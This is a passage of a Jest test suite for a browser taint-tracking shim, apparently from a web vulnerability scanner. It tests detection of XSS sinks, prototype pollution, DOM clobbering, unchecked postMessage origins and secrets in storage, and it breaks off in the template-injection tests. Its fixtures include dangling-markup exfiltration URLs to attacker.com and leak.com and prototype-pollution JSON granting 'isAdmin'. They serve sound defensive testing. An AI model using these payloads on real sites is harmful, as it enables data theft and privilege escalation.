//Filename: taint_shim.test.js
// internal/analysis/active/taint/taint_shim.test.js
/** @testEnvironment jsdom */

const fs = require('fs');
const path = require('path');

// =============================================================================
// 1. CONFIGURATION & CONSTANTS
// =============================================================================

const MOCK_CONFIG = {
    SinkCallbackName: "__scalpel_sink_event",
    ProofCallbackName: "__scalpel_execution_proof",
    ErrorCallbackName: "__scalpel_shim_error",
    IsTesting: "true"
};

const TAINT_PREFIX = 'SCALPEL';
const TAINTED_STRING = `${TAINT_PREFIX}_payload_abc`;
const CLEAN_STRING = "clean_payload_xyz";
const POLLUTION_CHECK_PROP = "scalpelPolluted"; // Default hardcoded in shim.js

// Regex patterns used in the shim (replicated here for verification)
const SENSITIVE_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
const AWS_KEY = "AKIAIOSFODNN7EXAMPLE";

// =============================================================================
// 2. HELPER FUNCTIONS
// =============================================================================

/**
 * Loads the shim into the current JSDOM window context.
 * Reads the file from disk and injects the mock configuration.
 * * @param {Array} sinksConfig - Array of sink definitions to inject into the template.
 */
function loadShim(sinksConfig) {
    // Assume shim is in the same directory
    const template = fs.readFileSync(path.join(__dirname, 'taint_shim.js'), 'utf8');
    let sinksJSON = (sinksConfig && typeof sinksConfig === 'object') ? JSON.stringify(sinksConfig) : (sinksConfig || '[]');

    const script = template
        .replace('{{.SinksJSON}}', sinksJSON)
        .replace('{{.SinkCallbackName}}', MOCK_CONFIG.SinkCallbackName)
        .replace('{{.ProofCallbackName}}', MOCK_CONFIG.ProofCallbackName)
        .replace('{{.ErrorCallbackName}}', MOCK_CONFIG.ErrorCallbackName)
        // We force IsTesting to false in the template logic so we can control it via window.__SCALPEL_TEST_MODE__
        .replace(/{{.IsTesting.*}}/g, 'false');

    try {
        // Execute the script in the context of the JSDOM window
        new Function('self', script)(window);
    } catch (e) {
        console.error("Error evaluating shim script during test setup:", e);
        throw e;
    }
}

/**
 * Helper to wait for async operations (MutationObservers, setTimeout(0)).
 * The shim heavily relies on `setTimeout(..., 0)` to decouple reporting from execution.
 * TEST-FIX: Updated to work with Jest Fake Timers and JSDOM Microtasks.
 */
const wait = async (ms = 50) => {
    // 1. Flush microtasks (e.g. MutationObserver callbacks, Promises).
    //    This ensures observers fire and schedule their reportSink (setTimeout) calls.
    await Promise.resolve();
    
    // 2. Advance timers to execute the scheduled setTimeout callbacks.
    jest.advanceTimersByTime(ms);
    
    // 3. Flush any new microtasks generated by the timers/callbacks.
    await Promise.resolve();
};

// =============================================================================
// 3. ROBUST MOCKS (Fetch, XHR, Request, Response)
// =============================================================================

const _reqPrivates = new WeakMap();

class MockRequest {
    constructor(url, options) {
        _reqPrivates.set(this, {
            url: url,
            method: (options && options.method) || 'GET',
            body: (options && options.body) || null
        });
    }
    get url() { return _reqPrivates.get(this).url; }
    get method() { return _reqPrivates.get(this).method; }
    get body() { return _reqPrivates.get(this).body; }
}

class MockResponse {
    constructor(body = '{}', init = { status: 200, headers: {} }) {
        this._body = body;
        this.status = init.status;
        // Simulate Headers object (Map-like behavior)
        this.headers = new Map(Object.entries(init.headers || {}).map(([k, v]) => [k.toLowerCase(), v]));
    }
    clone() {
        const headers = Object.fromEntries(this.headers.entries());
        return new MockResponse(this._body, { status: this.status, headers: headers });
    }
    text() {
        return Promise.resolve(this._body);
    }
}

class MockXHR {
    constructor() {
        this.readyState = 0;
        this.status = 0;
        this.responseText = '';
        this.responseType = '';
        this._headers = {};
        this._listeners = {};
        this._url = '';
        this._method = '';
    }
    open(method, url) { 
        this._method = method;
        this._url = url;
        this.readyState = 1; 
    }
    send() {
        this.readyState = 2;
    }
    getResponseHeader(header) {
        return this._headers[header.toLowerCase()] || null;
    }
    addEventListener(event, listener) {
        if (!this._listeners[event]) this._listeners[event] = [];
        this._listeners[event].push(listener);
    }
    removeEventListener(event, listener) {
        if (this._listeners[event]) {
            this._listeners[event] = this._listeners[event].filter(l => l !== listener);
        }
    }
    // Helper to simulate server response in tests
    _respond(status, headers, body) {
        this.status = status;
        this._headers = Object.fromEntries(Object.entries(headers).map(([k, v]) => [k.toLowerCase(), v]));
        this.responseText = body;
        this.readyState = 4;
        if (this._listeners['load']) {
            this._listeners['load'].forEach(listener => listener.call(this));
        }
    }
}

// =============================================================================
// 4. TEST SUITE START
// =============================================================================

describe('Scalpel Taint Shim V2 (Unabridged Compliance Suite)', () => {
    let mockSinkCallback, mockProofCallback, mockErrorCallback;
    let consoleLogSpy, consoleWarnSpy, consoleErrorSpy;

    // Variables to hold original native implementations for restoration (used as fallback)
    let originalAddEventListener, originalRemoveEventListener;
    let originalSetItemLocal;
    let originalImageSrcDescriptor;
    let originalFetch, originalXHR;
    let originalInnerHTMLDescriptor;
    let originalDocumentWrite;

    // TEST-FIX: Use Fake Timers to prevent asynchronous callbacks (setTimeout/setInterval)
    // from executing after JSDOM tears down the context, which causes native V8 crashes.
    beforeAll(() => {
        jest.useFakeTimers();
    });

    afterAll(() => {
        jest.useRealTimers();
    });

    beforeEach(() => {
        // 1. Setup Global Environment Flags
        if (!window.Request) window.Request = MockRequest;
        if (!window.Response) window.Response = MockResponse;
        window.__SCALPEL_TEST_MODE__ = true;
        
        // 2. Setup Callback Mocks
        mockSinkCallback = jest.fn();
        mockProofCallback = jest.fn();
        mockErrorCallback = jest.fn();
        window[MOCK_CONFIG.SinkCallbackName] = mockSinkCallback;
        window[MOCK_CONFIG.ProofCallbackName] = mockProofCallback;
        window[MOCK_CONFIG.ErrorCallbackName] = mockErrorCallback;

        // 3. Silence Console Output
        consoleLogSpy = jest.spyOn(console, 'log').mockImplementation(() => {});
        consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation(() => {});
        consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation(() => {});

        // 4. Capture Originals (Robust Restoration Fallback)
        originalAddEventListener = EventTarget.prototype.addEventListener;
        originalRemoveEventListener = EventTarget.prototype.removeEventListener;
        
        originalSetItemLocal = Storage.prototype.setItem;
        
        originalFetch = window.fetch;
        originalXHR = window.XMLHttpRequest;
        originalDocumentWrite = document.write;
        
        originalImageSrcDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
        originalInnerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');

        // 5. Setup Pre-Shim Mocks
        // We mock these *before* loading the shim so the shim wraps *our mocks*
        document.write = jest.fn();
        
        // Ensure Element.innerHTML is configurable for testing
        if (originalInnerHTMLDescriptor) {
             Object.defineProperty(Element.prototype, 'innerHTML', {
                set: jest.fn(function(value) { originalInnerHTMLDescriptor.set.call(this, value); }),
                get: originalInnerHTMLDescriptor.get,
                configurable: true,
            });
        }

        // 6. Clean Global Scope/Prototype (Fallback check before test starts)
        if (Object.prototype.hasOwnProperty(POLLUTION_CHECK_PROP)) {
            // If this warning appears, cleanup from the previous test failed.
            console.warn("Warning: Object.prototype was polluted before test started. Cleaning up.");
            delete Object.prototype[POLLUTION_CHECK_PROP];
        }
    });

    afterEach(() => {
        // TEST-FIX: Run any pending timers before cleanup to allow async reports to finish while context is valid.
        jest.runOnlyPendingTimers();

        // TEST-FIX: Call the explicit cleanup function provided by the shim.
        // This is the primary mechanism for restoring state and preventing crashes.
        if (window.__SCALPEL_INTERNALS__ && typeof window.__SCALPEL_INTERNALS__.cleanup === 'function') {
            try {
                window.__SCALPEL_INTERNALS__.cleanup();
            } catch (e) {
                console.error("Error during shim cleanup in afterEach:", e);
                // If cleanup fails, we proceed with manual restoration below.
            }
        }

        jest.restoreAllMocks();

        // 1. Restore Native Implementations (Fallback Restoration)
        // These steps ensure that even if the shim's internal cleanup failed, the environment is restored.
        if (originalAddEventListener && EventTarget.prototype.addEventListener !== originalAddEventListener) {
            EventTarget.prototype.addEventListener = originalAddEventListener;
        }
        if (originalRemoveEventListener && EventTarget.prototype.removeEventListener !== originalRemoveEventListener) {
            EventTarget.prototype.removeEventListener = originalRemoveEventListener;
        }
        if (originalSetItemLocal && Storage.prototype.setItem !== originalSetItemLocal) {
            Storage.prototype.setItem = originalSetItemLocal;
        }
        if (originalFetch && window.fetch !== originalFetch) {
            window.fetch = originalFetch;
        }
        if (originalXHR && window.XMLHttpRequest !== originalXHR) {
            window.XMLHttpRequest = originalXHR;
        }
        
        // Restore document.write if it exists and was changed
        if (originalDocumentWrite && document.write !== originalDocumentWrite) {
             document.write = originalDocumentWrite;
        }

        if (originalImageSrcDescriptor) {
            const currentDesc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
            if (!currentDesc || currentDesc.set !== originalImageSrcDescriptor.set) {
                Object.defineProperty(HTMLImageElement.prototype, 'src', originalImageSrcDescriptor);
            }
        }
        if (originalInnerHTMLDescriptor && originalInnerHTMLDescriptor.set) {
             const currentDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
             if (!currentDesc || currentDesc.set !== originalInnerHTMLDescriptor.set) {
                Object.defineProperty(Element.prototype, 'innerHTML', originalInnerHTMLDescriptor);
             }
        }

        // 2. Cleanup Globals
        delete window[MOCK_CONFIG.SinkCallbackName];
        delete window[MOCK_CONFIG.ProofCallbackName];
        delete window[MOCK_CONFIG.ErrorCallbackName];
        delete window.__SCALPEL_TAINT_INSTRUMENTED__;
        delete window.__SCALPEL_TEST_MODE__;
        delete window.__SCALPEL_INTERNALS__;
        
        if (window.Request === MockRequest) delete window.Request;
        if (window.Response === MockResponse) delete window.Response;

        // 3. Cleanup Observers & Intervals (Fallback Cleanup)
        if (window.__SCALPEL_CSTI_OBSERVER__) {
            window.__SCALPEL_CSTI_OBSERVER__.disconnect();
            delete window.__SCALPEL_CSTI_OBSERVER__;
        }
        if (window.__SCALPEL_BASE_TAG_OBSERVER__) {
            window.__SCALPEL_BASE_TAG_OBSERVER__.disconnect();
            delete window.__SCALPEL_BASE_TAG_OBSERVER__;
        }
        if (window.__SCALPEL_CLOBBERING_OBSERVER__) {
            window.__SCALPEL_CLOBBERING_OBSERVER__.disconnect();
            delete window.__SCALPEL_CLOBBERING_OBSERVER__;
        }
        if (window.__SCALPEL_POLLUTION_CHECK_INTERVAL__) {
            clearInterval(window.__SCALPEL_POLLUTION_CHECK_INTERVAL__);
            delete window.__SCALPEL_POLLUTION_CHECK_INTERVAL__;
        }

        // 4. Final DOM Cleanup
        if (Object.prototype.hasOwnProperty(POLLUTION_CHECK_PROP)) {
            delete Object.prototype[POLLUTION_CHECK_PROP];
        }
        document.body.innerHTML = '';
        document.head.innerHTML = '';
        localStorage.clear();
        sessionStorage.clear();
    });

    // =========================================================================
    // GROUP A: Internal Utilities & Heuristics
    // =========================================================================
    describe('Group A: Internal Utilities & Heuristics', () => {
        beforeEach(() => loadShim([]));

        describe('isSensitive()', () => {
            let isSensitive;
            beforeEach(() => { isSensitive = window.__SCALPEL_INTERNALS__.isSensitive; });

            it('should detect AWS Access Keys', () => {
                expect(isSensitive("User Access Key: AKIAIOSFODNN7EXAMPLE")).toBe(true);
            });

            it('should detect JWT Tokens (Bearer)', () => {
                expect(isSensitive(`Authorization: Bearer ${SENSITIVE_JWT}`)).toBe(true);
            });

            it('should detect High Entropy Strings (Generic API Key)', () => {
                // 32 chars hex
                expect(isSensitive("abcdef1234567890abcdef1234567890")).toBe(true);
            });

            it('should detect Credit Card Numbers (Simple)', () => {
                expect(isSensitive("4111111111111111")).toBe(true); // Visa-like
            });

            it('should return false for short or common strings', () => {
                expect(isSensitive("short")).toBe(false);
                expect(isSensitive("user_preference_dark_mode")).toBe(false);
            });
        });

        describe('looksLikeHTML()', () => {
            let looksLikeHTML;
            beforeEach(() => { looksLikeHTML = window.__SCALPEL_INTERNALS__.looksLikeHTML; });

            // Helper function to ensure strings meet the minimum length requirement (50 chars)
            const pad = (s) => s.padEnd(51, '_');

            it('should detect standard HTML tags', () => {
                expect(looksLikeHTML(pad("http://site.com?q=<div class='leak'>"))).toBe(true);
                expect(looksLikeHTML(pad("http://site.com?q=<span id='secret'>"))).toBe(true);
            });

            it('should detect input tags with values', () => {
                expect(looksLikeHTML(pad("http://site.com?q=<input value='password'>"))).toBe(true);
            });

            it('should detect excessive newlines (Exfiltration Heuristic)', () => {
                // Often used to break headers or format exfiltrated text
                // Heuristic requires > 5 newlines (so at least 6)
                expect(looksLikeHTML(pad("http://site.com?data=line1\nline2\nline3\nline4\nline5\nline6\nline7"))).toBe(true);
            });

            it('should return false for standard URLs', () => {
                expect(looksLikeHTML(pad("http://site.com/api/user/123"))).toBe(false);
            });

            it('should return false for short strings', () => {
                // Heuristic requires length >= 50
                expect(looksLikeHTML("<div>short</div>")).toBe(false); 
            });
        });

        describe('containsTemplateSyntax()', () => {
            let containsTemplateSyntax;
            beforeEach(() => { containsTemplateSyntax = window.__SCALPEL_INTERNALS__.containsTemplateSyntax; });

            it('should detect Mustache/Angular style syntax', () => {
                expect(containsTemplateSyntax("Hello {{ 7 * 7 }}")).toBe(true);
            });

            it('should ignore standard text', () => {
                expect(containsTemplateSyntax("Hello World")).toBe(false);
            });
        });

        describe('isTainted() - Robustness (Crash Fix)', () => {
            let isTainted;
            beforeEach(() => { isTainted = window.__SCALPEL_INTERNALS__.isTainted; });

            it('should safely handle DOM elements without crashing', () => {
                const div = document.createElement('div');
                // Assigning tainted data to a property, but the object itself is a Host Object
                div.dataset.test = TAINTED_STRING;
                
                // The shim should recognize this is a Node and stop traversal early.
                // If this test fails, it often crashes the Node process (Assertion failed: isolate_data).
                expect(isTainted(div)).toBe(false);
            });

            it('should safely handle the Window object without crashing', () => {
                window.temp_taint = TAINTED_STRING;
                // The shim should recognize this is the global scope and stop traversal.
                expect(isTainted(window)).toBe(false);
                delete window.temp_taint;
            });

            it('should correctly identify taint within standard objects', () => {
                const obj = { level1: { level2: TAINTED_STRING } };
                expect(isTainted(obj)).toBe(true);
            });
        });
    });

    // =========================================================================
    // GROUP B: Core Taint Flow (Source -> Sink)
    // =========================================================================
    describe('Group B: Core Taint Flow', () => {
        
        it('should instrument document.write (Function Wrapper)', async () => {
            // Config: Instrument document.write as an XSS sink
            loadShim([{ Name: "document.write", Type: "XSS", ArgIndex: 0 }]);
            
            document.write(TAINTED_STRING);
            await wait();

            // Check Native/Mock Execution
            expect(document.write).toHaveBeenCalledWith(TAINTED_STRING);
            
            // Check Report
            expect(mockSinkCallback).toHaveBeenCalledTimes(1);
            expect(mockSinkCallback.mock.calls[0][0].type).toBe("XSS");
            expect(mockSinkCallback.mock.calls[0][0].value).toBe(TAINTED_STRING);
        });

        it('should instrument Element.innerHTML (Property Setter)', async () => {
            loadShim([{ Name: "Element.prototype.innerHTML", Type: "XSS", Setter: true }]);
            
            const div = document.createElement('div');
            div.innerHTML = TAINTED_STRING;
            await wait();

            // Check Report
            expect(mockSinkCallback).toHaveBeenCalledTimes(1);
            const report = mockSinkCallback.mock.calls[0][0];
            expect(report.type).toBe("XSS");
            expect(report.detail).toBe("Element.prototype.innerHTML = value");
        });

        it('should NOT report if value is clean', async () => {
            loadShim([{ Name: "document.write", Type: "XSS", ArgIndex: 0 }]);
            document.write(CLEAN_STRING);
            await wait();
            expect(mockSinkCallback).not.toHaveBeenCalled();
        });

        it('should handle recursive calls gracefully (instrumentedCache)', async () => {
            // If we instrument a function that calls itself or is called repeatedly
            loadShim([{ Name: "document.write", Type: "XSS", ArgIndex: 0 }]);
            
            // Call twice
            document.write(TAINTED_STRING);
            document.write(TAINTED_STRING);
            await wait();
            
            expect(mockSinkCallback).toHaveBeenCalledTimes(2);
        });
    });

    // =========================================================================
    // GROUP C: Network Instrumentation (Fetch & XHR)
    // =========================================================================
    describe('Group C: Network Instrumentation', () => {
        
        describe('Fetch API (Advanced Instrumentation)', () => {
            let mockFetch;
            beforeEach(() => {
                mockFetch = jest.fn(() => Promise.resolve(new MockResponse('{}')));
                window.fetch = mockFetch;
                // Load shim with fetch configured to test both Taint Flow and Advanced features.
                loadShim([{ Name: "fetch", Type: "FETCH", ArgIndex: 0 }]);
            });

            it('Dangling Markup: Should detect HTML in Fetch URL (String)', async () => {
                const url = "http://attacker.com/?leak=<input value='secret'>_long_payload_string_padding_to_exceed_50_chars";
                await window.fetch(url);
                await wait();

                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "DANGLING_MARKUP_EXFILTRATION");
                expect(calls.length).toBeGreaterThan(0);
                expect(calls[0][0].value).toBe(url);
            });

            it('Dangling Markup: Should detect HTML in Fetch Request Object', async () => {
                const url = "http://attacker.com/?leak=<div id='secret'>_long_payload_string_padding_to_exceed_50_chars";
                const req = new Request(url);
                await window.fetch(req);
                await wait();

                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "DANGLING_MARKUP_EXFILTRATION");
                expect(calls.length).toBeGreaterThan(0);
                expect(calls[0][0].value).toBe(url);
            });

            it('Prototype Pollution: Should detect __proto__ in JSON response', async () => {
                const maliciousJSON = '{"__proto__": {"isAdmin": true}}';
                mockFetch.mockResolvedValue(new MockResponse(maliciousJSON, { 
                    headers: { 'Content-Type': 'application/json' } 
                }));

                await window.fetch('/api/user');
                await wait(); // Wait for response processing and reporting

                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "POTENTIAL_PP_VECTOR");
                expect(calls.length).toBeGreaterThan(0);
                const report = calls[0][0];
                expect(report.value).toBe("__proto__");
                expect(report.detail).toBe("Fetch_Response_JSON_payload");
            });

            it('Prototype Pollution: Should detect constructor.prototype in JSON response', async () => {
                const maliciousJSON = '{"constructor": {"prototype": {"isAdmin": true}}}';
                mockFetch.mockResolvedValue(new MockResponse(maliciousJSON, { 
                    headers: { 'Content-Type': 'application/json' } 
                }));

                await window.fetch('/api/config');
                await wait();

                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "POTENTIAL_PP_VECTOR");
                expect(calls.length).toBeGreaterThan(0);
                const report = calls[0][0];
                expect(report.value).toBe("constructor.prototype");
            });

            it('Standard Taint: Should detect tainted URL (Source->Sink)', async () => {
                // This tests the standard Taint Flow wrapper (instrumentSink) working alongside the Advanced wrapper.
                await window.fetch(TAINTED_STRING);
                await wait();
                
                // Verify the Taint Flow report (Type: FETCH_URL or configured Type)
                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "FETCH_URL" || c[0].type === "FETCH");
                expect(calls.length).toBeGreaterThan(0);
                expect(calls[0][0].detail).toBe("fetch(url/request)");
            });
        });

        describe('XMLHttpRequest (XHR)', () => {
            beforeEach(() => {
                window.XMLHttpRequest = MockXHR;
                loadShim([]);
            });

            it('Dangling Markup: Should detect HTML in XHR.open URL', async () => {
                // TEST-FIX: Shim looks for specific tags (div, span, input), not <br>.
                const url = "http://attacker.com/?leak=<div class='hidden'>_long_payload_string_padding_to_exceed_50_chars";
                const xhr = new XMLHttpRequest();
                xhr.open("GET", url);
                await wait();

                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].type).toBe("DANGLING_MARKUP_EXFILTRATION");
            });

            it('Prototype Pollution: Should detect pollution in XHR response body', async () => {
                const maliciousJSON = '{"__proto__": {"polluted": true}}';
                const xhr = new XMLHttpRequest();
                xhr.open("GET", "/api");
                xhr.send();
                
                // Simulate Response
                xhr._respond(200, { 'Content-Type': 'application/json' }, maliciousJSON);
                await wait(); // Wait for load event handler and reporting

                expect(mockSinkCallback).toHaveBeenCalled();
                const report = mockSinkCallback.mock.calls[0][0];
                expect(report.type).toBe("POTENTIAL_PP_VECTOR");
                expect(report.detail).toBe("XHR_Response_JSON_payload");
            });

            it('Should ignore non-JSON responses', async () => {
                const maliciousText = '{"__proto__": "safe because text/plain"}';
                const xhr = new XMLHttpRequest();
                xhr.open("GET", "/api");
                xhr.send();
                
                xhr._respond(200, { 'Content-Type': 'text/plain' }, maliciousText);
                await wait();

                expect(mockSinkCallback).not.toHaveBeenCalled();
            });
        });

        describe('Image Instrumentation (Dangling Markup)', () => {
            beforeEach(() => loadShim([]));

            it('Should detect dangling markup assigned to Image.src (created via new Image)', async () => {
                const img = new Image();
                const url = "http://leak.com?d=<div class='secret'>_long_payload_padding_to_exceed_50_chars";
                img.src = url;
                await wait();

                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].type).toBe("DANGLING_MARKUP_EXFILTRATION");
                expect(mockSinkCallback.mock.calls[0][0].detail).toContain("Image.src");
            });

            it('Should detect dangling markup assigned to Image.src (created via createElement)', async () => {
                const img = document.createElement('img');
                const url = "http://leak.com?d=<div class='secret'>_long_payload_padding_to_exceed_50_chars";
                img.src = url;
                await wait();

                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].type).toBe("DANGLING_MARKUP_EXFILTRATION");
            });
        });
    });

    // =========================================================================
    // GROUP D: Prototype Pollution (Trap, Write, Clobbering)
    // =========================================================================
    describe('Group D: Prototype Pollution Systems', () => {
        let internals;
        beforeEach(() => {
            loadShim([]);
            internals = window.__SCALPEL_INTERNALS__;
        });

        describe('1. Access Trap (Detection)', () => {
            it('should define a getter/setter trap on Object.prototype', () => {
                const desc = Object.getOwnPropertyDescriptor(Object.prototype, POLLUTION_CHECK_PROP);
                expect(desc).toBeDefined();
                expect(desc.get).toBeDefined();
                expect(desc.set).toBeDefined();
                // Verify using the internal symbol that the trap belongs to the current shim instance
                expect(desc.get[internals.PP_TRAP_IDENTIFIER]).toBe(true);
            });

            it('should report PROTOTYPE_POLLUTION_ACCESS when accessed on a plain object', async () => {
                const obj = {};
                // This triggers the getter on Object.prototype
                const result = obj[POLLUTION_CHECK_PROP];
                
                expect(result).toBe('scalpel_trap_activated');
                await wait();

                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].type).toBe("PROTOTYPE_POLLUTION_ACCESS");
            });

            it('should NOT report when accessed on Window/Global', async () => {
                // The shim has specific logic to ignore window[prop] access
                const result = window[POLLUTION_CHECK_PROP];
                await wait();
                expect(mockSinkCallback).not.toHaveBeenCalled();
            });

            it('should NOT report recursive calls (isReporting flag)', async () => {
                // Test the recursion protection mechanism.
                
                // Mock the callback to trigger the trap during its execution
                mockSinkCallback.mockImplementation(() => {
                    const obj_recursive = {};
                    // This access happens while isReporting is true.
                    const val = obj_recursive[POLLUTION_CHECK_PROP];
                    // If recursion protection works, the getter returns this specific string
                    expect(val).toBe('scalpel_trap_activated_ignored');
                });

                const obj = {};
                obj[POLLUTION_CHECK_PROP]; // Trigger initial report (schedules setTimeout)
                
                await wait(); // Executes the setTimeout callback (the mock implementation)
                
                // The callback should only have been invoked once for the initial trigger.
                expect(mockSinkCallback).toHaveBeenCalledTimes(1);
            });
        });

        describe('2. Write Detection (Confirmation)', () => {
            it('should detect active pollution via the Setter Trap', async () => {
                // Write a tainted value to the prototype property. This triggers the trapSetter.
                Object.prototype[POLLUTION_CHECK_PROP] = TAINTED_STRING;
                
                // The setter schedules checkPrototypePollution asynchronously (setTimeout 0)
                await wait(20);

                // Verify Sink Report
                expect(mockSinkCallback).toHaveBeenCalled();
                const report = mockSinkCallback.mock.calls[0][0];
                expect(report.type).toBe("PROTOTYPE_POLLUTION");
                expect(report.value).toBe(TAINTED_STRING);

                // Verify Cleanup: The shim should have deleted the property and re-installed the trap.
                const desc = Object.getOwnPropertyDescriptor(Object.prototype, POLLUTION_CHECK_PROP);
                expect(desc.get).toBeDefined(); 
                expect(desc.get[internals.PP_TRAP_IDENTIFIER]).toBe(true);
            });

            it('should NOT report if written value is benign (Clean)', async () => {
                Object.prototype[POLLUTION_CHECK_PROP] = CLEAN_STRING;
                await wait(20);
                // It detects the write, but checkPrototypePollution determines it's not tainted.
                expect(mockSinkCallback).not.toHaveBeenCalled();
            });
        });

        describe('3. DOM Clobbering', () => {
            // Note: JSDOM environment might not perfectly simulate DOM clobbering on the global object.
            // We simulate the condition (global variable existence) and rely on the shim's logic.

            it('should report if an Element clobbers the global variable', async () => {
                const el = document.createElement('div');
                el.id = POLLUTION_CHECK_PROP;
                document.body.appendChild(el);

                // Simulate JSDOM global clobbering behavior manually for the test
                Object.defineProperty(window, POLLUTION_CHECK_PROP, { value: el, configurable: true });

                // Re-initialize shim to force the initial checkClobbering run (as MutationObserver timing can be tricky)
                loadShim([]); 
                await wait(60);

                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "DOM_CLOBBERING");
                
                expect(calls.length).toBeGreaterThan(0);
                expect(calls[0][0].detail).toContain("Element <DIV>");
            });

            it('should report if an HTMLCollection clobbers the global variable', async () => {
                // Two elements with same name can create a collection
                const el1 = document.createElement('input');
                el1.name = POLLUTION_CHECK_PROP;
                const el2 = document.createElement('input');
                el2.name = POLLUTION_CHECK_PROP;
                document.body.appendChild(el1);
                document.body.appendChild(el2);

                // Mock collection clobber (using JSDOM's live collection/nodelist)
                const collection = document.getElementsByName(POLLUTION_CHECK_PROP);
                Object.defineProperty(window, POLLUTION_CHECK_PROP, { value: collection, configurable: true });

                loadShim([]);
                await wait(60);

                const calls = mockSinkCallback.mock.calls.filter(c => c[0].type === "DOM_CLOBBERING");
                expect(calls.length).toBeGreaterThan(0);
                // JSDOM might report this differently depending on version, but the shim check covers Element/HTMLCollection.
                expect(calls[0][0].detail).toMatch(/(HTMLCollection|Element)/);
            });
        });
    });

    // =========================================================================
    // GROUP E: Advanced Vulnerabilities (VALIDATING THE FIXES)
    // =========================================================================
    describe('Group E: Advanced Vulnerabilities (JSDOM Fix Validation)', () => {
        beforeEach(() => loadShim([]));

        describe('1. postMessage Security (JSDOM-FIX Issue 1)', () => {
            // FIX: The underlying issue was that in JSDOM, window.addEventListener's 'this' context
            // (WindowImpl) was not strictly equal (===) to the global 'scope' (WindowProxy).
            // The shim now uses a robust check (this === scope || this.window === scope).

            it('Vulnerable: Should report if listener does NOT access event.origin', async () => {
                // TEST-FIX: We use a plain function here instead of jest.fn().
                // jest.fn() automatically inspects arguments (including our Proxy),
                // which triggers the 'origin' getter trap.
                let handlerExecuted = false;
                const unsafeHandler = (e) => { 
                    handlerExecuted = true;
                    const val = e.data; // Taint sink access
                };
                window.addEventListener('message', unsafeHandler);

                window.dispatchEvent(new MessageEvent('message', {
                    data: TAINTED_STRING,
                    origin: "http://evil.com"
                }));

                await wait();
                
                expect(handlerExecuted).toBe(true);
                expect(mockSinkCallback).toHaveBeenCalled();
                const report = mockSinkCallback.mock.calls[0][0];
                expect(report.type).toBe("POSTMESSAGE_MISSING_ORIGIN_CHECK");
                expect(report.value).toBe("http://evil.com");
            });

            it('Safe: Should NOT report if listener checks event.origin', async () => {
                const safeHandler = jest.fn((e) => { 
                    if (e.origin === 'http://trusted.com') {
                        const val = e.data;
                    }
                });
                window.addEventListener('message', safeHandler);

                window.dispatchEvent(new MessageEvent('message', {
                    data: TAINTED_STRING,
                    origin: "http://trusted.com"
                }));

                await wait();
                expect(safeHandler).toHaveBeenCalled();
                expect(mockSinkCallback).not.toHaveBeenCalled();
            });

            it('Removal: Should support removeEventListener (JSDOM-FIX Issue 1)', async () => {
                const handler = jest.fn();
                
                window.addEventListener('message', handler);
                // This removal previously failed to find the wrapper in JSDOM.
                window.removeEventListener('message', handler);

                window.dispatchEvent(new MessageEvent('message', { data: 'test' }));

                expect(handler).not.toHaveBeenCalled();
            });

            it('Duplicate: Should handle adding the same listener twice', async () => {
                const handler = jest.fn();
                // The shim should return the *same* wrapper from the WeakMap
                window.addEventListener('message', handler);
                window.addEventListener('message', handler);

                // In standard DOM behavior, adding the same listener twice does nothing.
                // We dispatch the event once.
                window.dispatchEvent(new MessageEvent('message', { data: 'test', origin: 'http://test.com' }));
                
                // Handler should be called exactly once.
                expect(handler).toHaveBeenCalledTimes(1);
            });

            it('Object Listener: Should report vulnerability when listener is an object with handleEvent', async () => {
                let handlerExecuted = false;
                const unsafeHandler = {
                    handleEvent: function(e) {
                        handlerExecuted = true;
                        const val = e.data; // Taint sink access
                    }
                };
                window.addEventListener('message', unsafeHandler);

                window.dispatchEvent(new MessageEvent('message', {
                    data: TAINTED_STRING,
                    origin: "http://evil.com"
                }));

                await wait();

                expect(handlerExecuted).toBe(true);
                expect(mockSinkCallback).toHaveBeenCalled();
                const report = mockSinkCallback.mock.calls[0][0];
                expect(report.type).toBe("POSTMESSAGE_MISSING_ORIGIN_CHECK");
            });
        });

        describe('2. Storage Inspector (Local & Session)', () => {
            it('localStorage: Should detect sensitive data', async () => {
                localStorage.setItem("key", AWS_KEY);
                await wait();

                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].type).toBe("SENSITIVE_STORAGE_WRITE");
                expect(mockSinkCallback.mock.calls[0][0].value).toBe(AWS_KEY);
            });

            it('sessionStorage: Should detect sensitive data', async () => {
                // TEST-FIX: The shim requires the "Bearer " prefix for JWT detection logic to trigger.
                const tokenValue = `Bearer ${SENSITIVE_JWT}`;
                sessionStorage.setItem("token", tokenValue);
                await wait();

                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].type).toBe("SENSITIVE_STORAGE_WRITE");
                expect(mockSinkCallback.mock.calls[0][0].value).toBe(tokenValue);
            });

            it('Should handle keys and values independently', async () => {
                // Key is sensitive
                localStorage.setItem(AWS_KEY, "some value");
                await wait();
                expect(mockSinkCallback).toHaveBeenCalled();
                expect(mockSinkCallback.mock.calls[0][0].detail).toContain("storage key");
            });
        });

        describe('3. Client-Side Template Injection (CSTI) (JSDOM-FIX Issues 2 & 3)', () => {
            const OBSERVER_WAIT = 60;

